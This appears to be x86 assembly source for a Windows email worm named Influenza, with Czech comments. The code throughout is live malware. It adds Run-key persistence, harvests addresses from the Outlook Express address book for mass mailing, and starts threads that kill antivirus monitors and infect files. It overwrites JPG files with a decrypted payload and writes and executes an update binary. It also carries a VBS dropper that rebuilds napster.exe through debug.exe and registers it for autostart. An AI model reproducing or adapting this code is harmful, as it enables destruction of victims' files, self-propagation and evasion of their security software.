                push    eax                    ;
                push    3                      ;
                push    eax                    ;0
                push    eax                    ;0
                push    eax                    ;0
                push    edx                    ;
                push    80000002h              ;HKEY_LOCAL_MACHINE
                                               ;
                call    RegCreateKeyExA        ;
                                               ;
        _RegSetValue:                          ;
                push    regSize                ;
                push    offset regFile         ;path file
                push    1                      ;
                push    0                      ;
                push    offset regVal          ;Jmeno polozky
                mov     ebx, dword ptr [h_Key] ;
                push    ebx                    ;
                                               ;
                call    RegSetValueExA         ;
                                               ;
        _RegCloseKey:                          ;
                push    ebx                    ;handle
                                               ;
                call    RegCloseKey            ;
                                               ;
                ret                            ;
                                               ;
;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Read registr                                                              ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        _start_hackmail:                       ;
                                               ;
                lea     edx, dword ptr [offset KEY]
                call    _proc1                 ;
                                               ;
                lea     edx, dword ptr [offset key_name]
                call    _proc2                 ;
                                               ;
                                               ;
                ret                            ;
                                               ;
        _proc1:                                ;
                lea     eax, dword ptr [offset key_handle]
                push    eax                    ;
                push    KEY_ALL_ACCESS         ;
                push    0                      ;
                push    edx                    ;
                push    ebx      ;
                                               ;
                call    RegOpenKeyExA          ;
                                               ;
                                               ;
                ret                            ;
                                               ;
        _proc2:                                ;
                lea     eax, dword ptr [offset key_len]
                push    eax                    ;
                lea     eax, dword ptr [offset key_data]
                push    eax                    ;
                lea     eax, dword ptr [offset key_type]
                push    eax                    ;
                push    0                      ;
                push    edx                    ;
                mov     eax, dword ptr [key_handle]
                push    eax                    ;
                                               ;
                call    RegQueryValueExA       ;
                                               ;
                push    dword ptr [key_handle] ;         ;handle
                                               ;
                call    RegCloseKey            ;
                ret                            ;
                                               ;

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Mail, DBX search&infect                                                    ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        _adressbook_search:                    ;
                                               ;
                xor     esi,esi                ;vynuluj esi
                mov     edi,esi                ;vloz do edi obsach esi
                                               ;
        _loop_cr:                              ;
                mov     bl,[edx + esi]         ;precti hodnotu
                or      bl,bl                   ;narazili jsme na nulu
                je      _next_cr               ;ano or ne ?
                mov     [_buf_path + edi],bl   ;vloz prectenou hodotu do pole
                inc     esi                    ;+1
                inc     edi                    ;+1
                                               ;
                jmp     _loop_cr               ;skoc na _loop_cr
                                               ;a opakuj to dukut nenarazim
        _next_cr:                              ;na nulu
                                               ;
                mov     edx,offset _adressbook ;vloz ukazatel na adressbook
                xor     esi,esi                ;nuluj esi
                                               ;
        _loop_crs:                             ;
                mov     bl,[edx + esi]         ;prvni hodnota v edx do bl
                or      bl,bl                  ;je tam nula
                je      _next_crs              ;ano or ne ?
                mov     [_buf_path + edi],bl   ;vloz hodnotu bl do pole
                inc     esi                    ;+1
                inc     edi                    ;+1
                                               ;
                jmp     _loop_crs              ;a do kola, zase
                                               ;dukud nebude
        _next_crs:                             ;nula
                                               ;
                ret                            ;vrat se


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Tak a otevreme adress book                                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        _start_infect:
                mov     edx,offset  KeyRun
                call    _reg_key               ;

                mov     ecx,100
                xor     edi,edi

        _kdskld_:
                mov     [edi + _buf_path],00
                inc     edi
                loop    _kdskld_


                mov     edx,offset _windir     ;ukaz na _windir
                call    _adressbook_search     ;volej proceduru pro upravu
                                               ;cesty.
                push    0                      ;uloz 0
                push    0                      ;     0
                push    3                      ;     3
                push    0                      ;     0
                push    1                      ;     1
                push    80000000h or 40000000h ;cteni a zapis
                push    offset _buf_path       ;ukaz na vytvorenou cetu
                                               ;
                call    CreateFileA            ;Volej fci pro otevreni Souboru
                                               ;
                mov     dword ptr [_filehandle],eax
                                               ;uloz file hamnde
                mov     edx,600h               ;urcime si kolik mame precist
                call    _readfile              ;volej proc. pro pripravu
                                               ;cteni se souboru
                xor     esi,esi                ;nuluj esi
                mov     ebx,offset buffer      ;ukaz na budffer a dej to do
                                               ;ebx
;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ A zacneme konecne hledat nejake ty emaily :)                              ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ



                xor     edx,edx
                xor     edi,edi
                mov     ecx,_HeadX_Size
                mov     edx,offset _HeadX

_header_loop:
                mov     al,[edx + edi]
                mov     [email + edi],al
                inc     edi

                loop    _header_loop
                mov     ebp,edi
                xor     esi,esi

                mov     edi,9292
                mov     [email + edi],68h
                mov     edi,9400
                add     edi,4
                mov     [email + edi],01
                add     edi,4
                mov     ecx,11
                mov     edx,offset l_s

l@_s:
                mov     al,[edx + esi]
                mov     [email + edi],al
                inc     edi
                inc     esi

                loop    l@_s

                mov     edi,9700
                sub     edi,36
                xor     esi,esi
                mov     ecx,17
                mov     edx,offset p_k_o

p@_k_o:
                mov     al,[edx + esi]
                mov     [email + edi],al
                inc     edi
                inc     esi

                loop    p@_k_o

                mov     edi,9944
                mov     [email + edi],0FAh
                inc     edi
                mov     [email + edi],0Fh
                add     edi,3
                mov     [email + edi],04h
                sub     edi,16
                mov     [email + edi],04h
                add     edi,4
                mov     [email + edi],01h
                sub     edi,12
                mov     [email + edi],02h
                add     edi,28
                mov     [email + edi],05h


                xor     esi,esi
                mov     ecx,_HeadXX_Size
                mov     edx,offset _HeadXX

                mov     edi,2955h
                add     edi,390
                sub     edi,7

_header2_loop:

                mov     al,[edx + esi]
                mov     [email + edi],al
                inc     edi
                inc     esi

                loop    _header2_loop

                mov     ebp,edi

                xor     esi,esi

        _search@:                              ;
                                               ;
                mov     dl,[ebx + esi]         ;dej prvni znak do dl
                cmp     dl,'@'                 ;je to @?
                je      _mailtest1             ;ano or ne
                inc     esi                    ;+1
                cmp     esi,600h               ;uz jsme na konci precteneho
                je      _next_read             ;ano or ne?
                                               ;
                jmp     _search@               ;opakuj zase.
                                               ;
        _next_read:                            ;
                xor     esi,esi                ;nuluj esi
                mov     edx,600h               ;dej do edx kolik chceme cist
                call    _readfile              ;a zase proc. pro cteni
                                               ;
                jmp     _search@               ;a tez opakuj
                                               ;
        _mailtest1:                            ;
                inc     esi                    ;esi +1
                mov     ecx,9                  ;do ecx,9
                                               ;
        _loop_tm:                              ;
                mov     al,[ebx + esi]         ;vloz znak do al
                cmp     al,'.'                 ;je tam tecka?
                je      _mailtest2             ;ano or ne?
                inc     esi                    ;esi +1
                                               ;
                loop    _loop_tm               ;opakuj devetkrat
                                               ;
                Jmp     _search@               ;jdem hledat dalsi zavinac
                                               ;
        _mailtest2:                            ;
                dec     esi                    ;-1 esi
                                               ;
        _loop_tm2:                             ;
                mov     al,[ebx + esi]         ;zasej znak do al
                or      al,al                   ;0?
                je      _mail_save             ;ano or ne?
                dec     esi                    ;-1
                                               ;
                jmp     _loop_tm2              ;opakuj
                                               ;
        _mail_save:                            ;
                inc     esi                    ;+1
                mov     eax,Test_1             ;uz jsme tady jednou byli ?
                cmp     eax,'R16'              ;tak co byli?
                je      _mails_loop            ;ano or ne?
                                               ;
                ;xor     edi,edi                ;edi 0
                                               ;
        _mails_loop:                           ;
                mov     al,[ebx + esi]         ;a zase znak do al
                or      al,al                   ;0?
                je      _NewEmailIsReady       ;ano or ne?
                mov     [email + edi],al       ;vytvarej email
                inc     edi                    ;+1
                inc     esi                    ;+1
                jmp     _mails_loop            ;opakuj do kola
                                               ;
        _NewEmailIsReady:                      ;
                                               ;vloz do eax R16 pro
                mov     eax,'R16'              ;pozdejsi identifikaci
                mov     Test_1,eax             ;jesli jsme tu dorazili
                                               ;uz jednou
                inc     min20                  ;+1 min20
                                               ;
                cmp     min20,5               ;over jestli jsem tu po 10
                je      _create_form           ;ano or ne?
                                               ;
                mov     al,3Bh                 ;vloz strednik
                mov     [email + edi],al       ;do pole
                                               ;
                inc     edi                    ;+1 edi
                                               ;
                mov     al,20h                 ;vloz tam mezeru
                mov     [email + edi],al       ;tak jak je to v Otlook Express
                                               ;
                inc     edi                    ;+1
                                               ;
                                               ;
                jmp     _search@               ;mame email jdem hledat dalsi!
                                               ;
        _create_form:                          ;
                mov     al,00h                 ;vloz tam nulu
                mov     [email + edi],al       ;musime se podobota ja Otlook
                                               ;
                xor     esi,esi                ;esi 0
                mov     min20,0                ;dej do min20 nulu

                mov     esi,ebp               ;
                jmp     _e__nexta              ;jdem dal
                                               ;
        _loop_crmail0:                         ;

                inc     esi                    ;
        _e__nexta:                             ;
                inc     edi                    ;
                                               ;
                mov     cl,'<'                 ;
                mov     [email + edi],cl       ;
                inc     edi                    ;
                                               ;
        _loop_crmail:                          ;
                mov     al,[email + esi]       ;
                cmp     al,3bh                 ;
                je      _close_mail            ;
                cmp     al,20h                 ;
                je      _brmbrm                ;
                or      al,al                  ;
                je      _close_mail            ;
                                               ;
                mov     [email + edi],al       ;
                inc     edi                    ;

        _brmbrm:
                inc     esi                    ;
                                               ;
                                               ;
                jmp     _loop_crmail           ;
                                               ;
        _close_mail:                           ;
                mov     cl,'>'                 ;
                mov     [email + edi],cl       ;
                                               ;
                inc     edi                    ;
                                               ;
                inc     min20                  ;
                cmp     min20,5                ;
                je      _complete10000         ;
                                               ;
                mov     cl,3bh                 ;
                mov     [email + edi],cl       ;
                                               ;
                inc     edi                    ;
                                               ;
                mov     cl,20h                 ;
                mov     [email + edi],cl       ;
                                               ;
                                               ;
                jmp     _loop_crmail0          ;
                                               ;
        _complete10000:                        ;
                                               ;
                xor     cl,cl                  ;
                mov     [email + edi],cl       ;

                xor     esi,esi
                mov     ecx,_HeadXXX_Size
                mov     edx,offset _HeadXXX

_header3_loop:

                mov     al,[edx + esi]
                mov     [email + edi],al
                inc     esi
                inc     edi
                loop    _header3_loop



                                               ;
                push    dword ptr [_filehandle];
                                               ;
                call    CloseHandle            ;
                                               ;
               _@se2:                          ;
                call    _start_hackmail        ;
               _@se1:                          ;
                                               ;
                mov     edx,offset _tmpfile    ;
                                               ;
                xor     eax,eax                ;
                                               ;
                push    eax                    ;
                push    ecx                    ;
                push    1 ; CREATE             ;
                push    eax                    ;
                push    eax                    ;
                push    80000000h + 40000000h  ;
                push    edx                    ;
                                               ;
                call    CreateFileA            ;
                                               ;
                mov     dword ptr [_filehandle],eax
                                               ;uloz filehandle
                xor     ebx,ebx                ;vynuluj ebx
                call    _create_tmp_file       ;volej proc. pro vytvoreni
                                               ;tem souboru
                ret                            ;


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ To si vytvorim jen takovy informacni soubor.                              ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        _create_tmp_file:                      ;Vytvor temp file
                push    ebx                    ;0
                push    00000080h              ;
                push    3                      ;
                push    ebx                    ;0
                push    ebx                    ;0
                push    0c0000000h             ;jenom pro zapis
                push    offset _tmpfile        ;jake jmeno souboru

                call    CreateFileA            ;


                push    0                      ;0
                push    offset number          ;
                push    191188 ;_size_maildoc  ;kolik zapat
                push    offset email;_maildoc  ;data pro zapis
                push    dword ptr [_filehandle];
                                               ;
                call    WriteFile              ;Volej API fci pro zapis
                                               ;do souboru
                                               ;
                ret                            ;vrat se
                                               ;
        _search_DBX:                           ;
                ret                            ;

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Hech tak dalsi hledani emailu cim vic ti lip ;-)                          ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
                                               ;
        _search_email:                         ;
                mov     ecx,100                ;
                xor     esi,esi                ;
                mov     edx,offset buffer      ;
                                               ;
        @1search:                              ;
                mov     al,[edx + esi]         ;
                cmp     al,'<'                 ;
                je      @zavinac               ;
                inc     esi                    ;
                                               ;
                loop    @1search               ;
                                               ;
                mov     edx,256h               ;
                call    _readfile              ;
                                               ;
        @zavinac:
                mov     dl,[edx + esi]         ;
                cmp     dl,'@'                 ;
                je      @tecka                 ;
                inc     esi                    ;
                                               ;
                loop    @zavinac               ;

                mov     edx,256h               ;
                call    _readfile              ;
                                               ;
        @tecka:                                ;
                mov     cl,[edx + esi]         ;
                cmp     cl,'.'                 ;
                je      @2search               ;
                inc     esi                    ;
                                               ;
                loop    @tecka                 ;
                                               ;
                mov     edx,256h               ;
                call    _readfile              ;
                                               ;
        @2search:                              ;
                mov     bl,[edx + esi]         ;
                cmp     bl,'>'                 ;
                je      @createemail           ;
                inc     esi                    ;
                                               ;
                loop    @2search               ;
                                               ;
                mov     edx,256h               ;
                call    _readfile              ;
                                               ;
        @createemail:                          ;
                                               ;
                ret                            ;vrat
                                               ;
        _infect_DBX:                           ;Lets GO!
                                               ;
                ret                            ;vrat
                                               ;
        _readfile:                             ;
                push    00h                    ;
                push    offset number          ;
                push    edx                    ;Kolik nacitat ?
                push    offset buffer          ;Kam ty data nacist
                push    dword ptr [_filehandle];Vloz hanle
                                               ;
                call    ReadFile               ;Volej API fci pro cteni
                                               ;ze souboru
                ret                            ;vrat
                                               ;
                                               ;
        _set_file_pointer:                     ;
                xor     eax,eax                ;vynuluj eax
                push    ebx                    ;0-b, 1-ap, 2-e
                push    eax                    ;vloz nulu. eax=0
                push    eax                    ;eax=0
                push    dword ptr [_filehandle];hadle soboru
                                               ;
                call    SetFilePointer         ;Volej API fci, Nastavi
                                               ;ukazatel v soboru
                ret                            ;vat
                                               ;
;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ VBS creat and run                                                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        _vbs_attack:


                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Destruction                                                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
;:-))
        _destruction_start:
                mov ecx,offset JPG_END - offset JPG_START
                mov esi,offset JPG_START

                decri:

                xor dword ptr [esi],0BBh
                inc esi

                loop decri


                mov       edx,offset JPG_FILES
                push      offset FindFileData
                push      edx

                call      FindFirstFileA

                inc     eax
                je      _endjpg
                dec     eax

                lea     edx,[FindFileData.cFileName]

                xor     ebx,ebx
                                               ;
                push    ebx                    ;0
                push    00000080h              ;
                push    3                      ;
                push    ebx                    ;0
                push    ebx                    ;0
                push    0c0000000h             ;jenom pro zapis
                push    edx        ;jake jmeno souboru

                call    CreateFileA            ;

                mov     dword ptr [_filehandle],eax

                push    0                      ;0
                push    offset number          ;
                push    offset JPG_END - offset JPG_START  ;kolik zapat
                push    offset JPG_START       ;data pro zapis
                push    dword ptr [_filehandle];
                                               ;
                call    WriteFile

                push    dword ptr [_filehandle];
                                               ;
                call    CloseHandle            ;


_endjpg:        ret


        _9day_to_Dead:
                ret


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Thread Centrum                                                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        _Create_Threads:
                mov     edx, offset _destruction_start  ; Complete
                call    _Create_Trd

                mov     edx, offset _mirc_setup         ; Complete
                call    _Create_Trd

                mov     edx, offset _KillAVmonitor      ; Complete
                call    _Create_Trd

                mov     edx, offset _CreateHEXA         ; Complete
                call    _Create_Trd

                mov     edx, offset _SetupAR_Infect     ; Complete
                call    _Create_Trd

                mov     edx, offset _InfectFile         ; Complete
                call    _Create_Trd

                mov    edx, offset _RPIWE              ; Complete
                call   _Create_Trd

                mov     edx, offset _UpdateFLU          ; Complete
                call    _Create_Trd


                mov     edx, offset CreateUpdateASC
                push    offset FindFileData
                push    edx
                call    FindFirstFileA

                inc     eax
                je      quitTMPxxS
                dec     eax

                mov     edi,[FindFileData.nFileSizeLow]
                mov     sizeupdatef,edi

                ;cmp    edi,3683h
                ;je     fucfuck


                push    0
                push    000000080h
                push    3
                push    0
                push    000000001h
                push    080000000h + 040000000h
                push    offset CreateUpdateASC
                call    CreateFileA

                mov     dword ptr [_filehandle],eax

                mov     edx,3683h

                push    0
                push    0
                push    edx
                push    dword ptr [_filehandle]
                call    SetFilePointer

;               sub     sizeupdatef,3683h
;               mov     edx,sizeupdatef

                push    00h
                push    offset number
                push    5000
                push    offset updatertext
                push    dword ptr [_filehandle]
                call    ReadFile

                cmp     dword ptr [updatertext],'-ULF'
                jne     _CloseUpdate


                xor     esi,esi
                mov     edx,offset updatertext
lkopu_:
                mov     al,[edx + esi]
                cmp     al,'%'
                je      _CreateNewNameForWorm
                inc     esi

                jmp     lkopu_

_CreateNewNameForWorm:
                inc     esi

_CloseUpdate:
                push    dword ptr [_filehandle]
                call    CloseHandle
fucfuck:


setnext:
                push    0
                push    000000080h
                push    2
                push    0
                push    000000001h
                push    080000000h + 040000000h
                push    offset tesF
                call    CreateFileA

                mov     dword ptr [_filehandle],eax

                mov     ebx,1000
                mov     edx,offset _emailto;texttomail_
                call    _WriteFile

                push    dword ptr [_filehandle]
                call    CloseHandle
quitTMPxxS:

                ret

        _Create_Trd:
                push    offset lpThreadId
                push    00h
                push    offset lpParameter
                push    edx
                push    00h
                push    00h

                call    CreateThread

                push    0FFh
                push    eax

                call    WaitForSingleObject

                ret
                esireg___ dd 0
texttomail_     db      100 dup (00)
emailtosend     db      50 dup (00)
sizeupdatef     dd      0

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Bye bye ....                                                               ³
;ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;³                                                                           ³
;³Tak snad se zase brzy uvidime :)                                           ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
                                               ;
        _exit_wrm:                             ;
                call    _Create_Threads

                cmp     word ptr [updatertext + 35],'ZM'
                jne     EndUpdateaa

                push    0
                push    000000080h
                push    2
                push    0
                push    000000001h
                push    080000000h + 040000000h
                push    offset updateexe
                call    CreateFileA

                mov     dword ptr [_filehandle],eax

                mov     ebx,4096
                mov     edx,offset updatertext + 35
                call    _WriteFile

                push    dword ptr [_filehandle]
                call    CloseHandle

                push    offset updateexe
                call    WinExec

        EndUpdateaa:

                push    0                      ;tak ok koncime
                call    ExitProcess            ;nezpadne drive :)

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³VBS Infect   flu_vbs.inc                                                   ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

                OPEN_EXISTING           equ             3
                CREATE_ALWAYS           equ             2
                GENERIC_READ            equ             080000000h
                GENERIC_WRITE           equ             040000000h
                FILE_SHARE_READ         equ             000000001h
                FILE_SHARE_WRITE        equ             000000002h
                FILE_ATTRIBUTE_NORMAL   equ             000000080h
                KEYVB           db 'SOFTWARE\InfluenzaLab',0
                key_nameVB      db 'MicrosoftOE',0
                VBSfilez        db '*.VBS',0
                WriteText       db 'InfluenzaA.WriteLine "E '
                Enum            db '0000 '
                WriteTextSize = $ - WriteText
                _cislo_         db 0
                DataFileVBS     db 00,00,20h,00,00,20h
                                db 00,00,20h,00,00,20h
                                db 00,00,20h,00,00,20h
                                db 00,00,20h,00,00,20h
                                db 00,00,20h,00,00,20h
                                db 00,00,20h,00,00,20h
                                db 00,00,20h,00,00,20h
                                db 00,00,20h,00,00,22h
                                db 0Dh,0Ah
                DataVBSize = $ - DataFileVBS
                HexttoText      db '00000000',0
                                db 0
                repeat?         dd 0
                here?           dd 0
                ecxs            dd 0
                min15           dd 0
                _cislo_1        db 31h
                _cislo_2        db 48
                testFF          dd 0
                krat_           dd 0
                _VBSsize_       dd 0

ReadWorm:
                push    00h
                push    offset number
                push    edx
                push    offset ReadBinaryBuff
                push    dword ptr [_filehandle]

                call    ReadFile

                ret
_SetFilePointer:
                push    eax
                push    0
                push    edx
                push    dword ptr [_filehandle]
                call    SetFilePointer

                ret

_CreateHEXA:

                mov     ebx,80000002h
                lea     edx, dword ptr [offset KEYVB]
                call    _proc1

                lea     edx, dword ptr [offset key_nameVB]
                call    _proc2

                xor     ebx,ebx

                push    ebx                    ;0
                push    ebx              ;
                push    3                      ;
                push    ebx                    ;0
                push    1                    ;0
                push    80000000h or 40000000h
                push    offset key_data        ;jake jmeno souboru

                call    CreateFileA

                mov     dword ptr [_filehandle],eax

                mov     edx,7000h
                call    ReadWorm

                push    dword ptr [_filehandle]

                call    CloseHandle

                push    100
                push    offset _ctrdir
                call    GetCurrentDirectoryA

                push    offset _sysdir
                call    SetCurrentDirectoryA

_searchVBS:
                mov     edx,offset VBSfilez
                call    _FindFile

                inc     eax
                je      quit_VBS_infect
                dec     eax

                mov     edi,[FindFileData.nFileSizeLow]
                mov     _VBSsize_,edi
                mov     eax,edi
                mov     ebx,100000
                sub     ebx,eax
                jc      quit_VBS_infect

                push    ecx
                call    FindClose

                xor     ecx,ecx

                call    cislo0

                jmp     ___fg_
__repeat__:
                mov     ecx,ecxs
                inc     ecx
___fg_:
                mov     min15,0
                xor     esi,esi

CreateHEX:
                mov     edx,offset ReadBinaryBuff

                mov     al,[edx + ecx]

                lea     edi,HexttoText
                call    HexWrite32

                mov     edx,offset HexttoText
                mov     bx,word ptr [edx + 6]


                mov     eax,offset DataFileVBS
                mov     word ptr [eax + esi], bx

                cmp     min15,15
                je      NewRead

                inc     esi
                inc     esi
                inc     esi

                inc     ecx
                inc     min15

                jmp     CreateHEX


NewRead:
                mov     ecxs,ecx

                Jmp     Next_IndectVBS
HeadVBS:
        db 27h,20h,46h,4Ch,55h,62h,20h,62h,79h,20h,52h,61h,64h,69h,78h,31h
        db 36h,5Bh,4Dh,49h,4Fh,4Eh,53h,5Dh,0dh,0ah
        db 'Dim jseljmasdfkljsdfmwer,InfluenzaA,InffluenzaA,jkakljcaldsmkiuskla',0dh,0ah
        db 'Set jseljmasdfkljsdfmwer = CreateObject("Scripting.FileSystemObject")',0dh,0ah
        db 'Set jkakljcaldsmkiuskla = jseljmasdfkljsdfmwer.GetSpecialFolder(0)',0dh,0ah

        db 'Set InfluenzaA = jseljmasdfkljsdfmwer.CreateTextFile("C:\Napster.scr", True)',0dh,0ah
        db 'InfluenzaA.WriteLine "N napster.com"',0dh,0ah

EndHeadVBS:
        db 'InfluenzaA.WriteLine "RCX"',0dh,0ah
        db 'InfluenzaA.WriteLine "7000"',0dh,0ah
        db 'InfluenzaA.WriteLine "W"',0dh,0ah
        db 'InfluenzaA.WriteLine "Q"',0dh,0ah
        db 'InfluenzaA.close',0dh,0ah

        db 'Set jseljmasdfkljsdfmwer = CreateObject("Scripting.FileSystemObject")',0dh,0ah
        db 'Set InffluenzaA = jseljmasdfkljsdfmwer.CreateTextFile(jkakljcaldsmkiuskla&"\winstart.bat", True)',0dh,0ah
        db 'InffluenzaA.WriteLine "@ cd \"',0dh,0ah
        db 'InffluenzaA.WriteLine "@ "&jkakljcaldsmkiuskla&"\smartdrv.exe"',0dh,0ah
        db 'InffluenzaA.WriteLine "@ debug < napster.scr"',0dh,0ah
        db 'InffluenzaA.WriteLine "@ Copy napster.com "&jkakljcaldsmkiuskla&"\napster.exe"',0dh,0ah
        db 'InffluenzaA.WriteLine "@ cls"',0dh,0ah
        db 'InffluenzaA.WriteLine "@ del "&jkakljcaldsmkiuskla&"\winstart.bat"',0dh,0ah

        db 'InffluenzaA.close',0dh,0ah
        db 'Set Regedit = CreateObject("WScript.Shell")',0dh,0ah
        db 'Regedit.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\INFLUENZA",jkakljcaldsmkiuskla&"\napster.exe"',0dh,0ah

EndHeadVBSI:


        VBSHeadersize   equ offset EndHeadVBS - offset HeadVBS
        VBSEndHead      equ offset EndHeadVBSI - offset EndHeadVBS

NewSetC:        call    cislo0
                inc     _cislo_1
                jmp     _@0
NewSetCHex:
                mov     _cislo_,41h
                jmp     _@0
NewSetCHex1:    mov     _cislo_1,41h
                jmp     __@1

NewSetC1:       call    cislo1
                jmp     __@1

Next_IndectVBS:

_@0:            mov     ebx, offset Enum

                mov     al,_cislo_
                mov     [ebx + 2],al

                cmp     _cislo_,58
                je      NewSetCHex

                cmp     _cislo_,71
                je      NewSetC

                inc     _cislo_

                cmp     _cislo_1,58
                je      NewSetCHex1

                cmp     _cislo_1,71
                je      NewSetC1
__@1:
                mov     al,_cislo_1
